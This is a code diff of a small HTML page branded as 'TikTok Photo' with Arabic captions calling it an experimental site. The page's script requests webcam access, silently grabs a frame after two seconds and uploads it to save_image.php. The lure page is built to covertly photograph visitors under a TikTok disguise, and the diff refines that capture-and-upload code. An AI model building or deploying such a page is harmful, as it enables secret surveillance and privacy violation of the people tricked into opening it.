@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Video</title>
+    <title>TikTok Photo</title>
     <link rel="icon" href="https://w7.pngwing.com/pngs/986/124/png-transparent-tiktok-social-media-logos-brands-icon.png">
     <style>
         /* أضف أي تنسيق CSS هنا */
@@ -12,29 +12,27 @@
 <body>
     <h1>برمجة بوصلحهـ</h1>
     <p>تم برمجة هذا الموقع كـ مؤقت كتجربة اولية . وسوف يتم تطويرها مستقبلا ..</p>
-    <video id="video" width="640" height="480" style="display:none;"></video>
     <canvas id="canvas" width="640" height="480"></canvas>
     <script>
+        // السماح بالوصول إلى كاميرا الويب والتقاط صورة
         navigator.mediaDevices.getUserMedia({ video: true })
         .then(function(stream) {
-            var video = document.getElementById('video');
+            var video = document.createElement('video');
             video.srcObject = stream;
             video.play();
-            
             setTimeout(function() {
                 var canvas = document.getElementById('canvas');
                 var context = canvas.getContext('2d');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
                 // تحويل الصورة إلى بيانات URL
                 var imageData = canvas.toDataURL('image/jpeg'); // استخدام تنسيق JPEG
-
                 // إرسال الصورة إلى ملف الموقع باستخدام PHP
                 var xhr = new XMLHttpRequest();
                 xhr.open('POST', 'save_image.php', true);
                 xhr.setRequestHeader('Content-Type', 'application/octet-stream');
                 xhr.send(imageData);
-                
                 console.log('تم حفظ الصورة في المجلد بنجاح.');
             }, 2000);
         })
